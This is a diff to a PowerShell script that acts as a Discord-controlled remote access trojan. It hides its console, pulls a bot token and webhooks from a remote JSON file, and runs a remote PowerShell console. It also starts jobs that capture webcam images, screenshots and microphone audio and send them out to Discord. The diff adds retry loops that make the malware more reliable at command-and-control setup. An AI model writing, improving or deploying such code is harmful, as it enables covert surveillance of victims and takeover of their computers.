@@ -84,13 +84,17 @@ Function GetFfmpeg{
 Function NewChannelCategory{
     $headers = @{
         'Authorization' = "Bot $token"
-    }    
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", $headers.Authorization)    
-    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
-    $guilds = $response | ConvertFrom-Json
-    foreach ($guild in $guilds) {
-        $guildID = $guild.id
+    }
+    $guildID = $null
+    while (!($guildID)){    
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Authorization", $headers.Authorization)    
+        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
+        $guilds = $response | ConvertFrom-Json
+        foreach ($guild in $guilds) {
+            $guildID = $guild.id
+        }
+        sleep 3
     }
     $uri = "https://discord.com/api/guilds/$guildID/channels"
     $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
@@ -262,7 +266,7 @@ function HideWindow {
     }
 }
 
-# Scriptblock for PS console to discord
+# Scriptblock for PS console in discord
 $doPowershell = {
 param([string]$token,[string]$PowershellID)
 
@@ -405,9 +409,9 @@ $camJob = {
 
 # Delete all temp media files
 function Cleanup {
-$campath = "$env:Temp\Image.jpg"
-$screenpath = "$env:Temp\Screen.jpg"
-$micpath = "$env:Temp\Audio.mp3"
+    $campath = "$env:Temp\Image.jpg"
+    $screenpath = "$env:Temp\Screen.jpg"
+    $micpath = "$env:Temp\Audio.mp3"
     If (Test-Path $campath){  
         rm -Path $campath -Force
     }
@@ -443,12 +447,14 @@ If ($hideconsole -eq 1){
 
 # Get token and webhooks from online json file (if using option 2)
 if ($token.length -ne 72){
-$keys = irm "$uri"
-$global:token = $keys.tk
-$global:ScreenshotWebhook = $keys.scrwh
-$global:WebcamWebhook = $keys.camwh
-$global:MicrophoneWebhook = $keys.micwh
-sleep 1
+    while ($token.length -ne 72){
+        $keys = irm "$uri"
+        $global:token = $keys.tk
+        $global:ScreenshotWebhook = $keys.scrwh
+        $global:WebcamWebhook = $keys.camwh
+        $global:MicrophoneWebhook = $keys.micwh
+        sleep 3
+    }
 }
 
 # Create category and new channels
@@ -489,7 +495,7 @@ sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :whit
 
 # -----------------------  MAIN LOOP  ---------------------------
 
-# Begin checking for new messages
+# Begin main loop checking for new messages
 while ($true) {
 
     $headers = @{
@@ -510,42 +516,33 @@ while ($true) {
         $sceenrunning = Get-Job -Name Screen
         $audiorunning = Get-Job -Name Audio
         $PSrunning = Get-Job -Name PSconsole
-
         if ($messages -eq 'webcam'){
             if (!($camrunning)){
                 Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID, $global:WebcamWebhook
                 sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
             }
-            else{
-                sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"
-            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
         }
         if ($messages -eq 'screenshot'){
             if (!($sceenrunning)){
                 Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID, $global:ScreenshotWebhook
                 sendMsg -Message ":desktop: ``$env:COMPUTERNAME Screenshot Session Started!`` :desktop:"
             }
-            else{
-                sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"
-            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
         }
         if ($messages -eq 'psconsole'){
             if (!($PSrunning)){
                 Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                 sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
             }
-            else{
-                sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"
-            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
         }
         if ($messages -eq 'audio'){
             if (!($audiorunning)){
                 Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID, $global:MicrophoneWebhook
                 sendMsg -Message ":microphone2: ``$env:COMPUTERNAME Microphone Session Started!`` :microphone2:"
             }
-            else{
-                sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" -webhook $webhook
-            }
+            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
         }
         if ($messages -eq 'pause'){
             Stop-Job -Name Audio
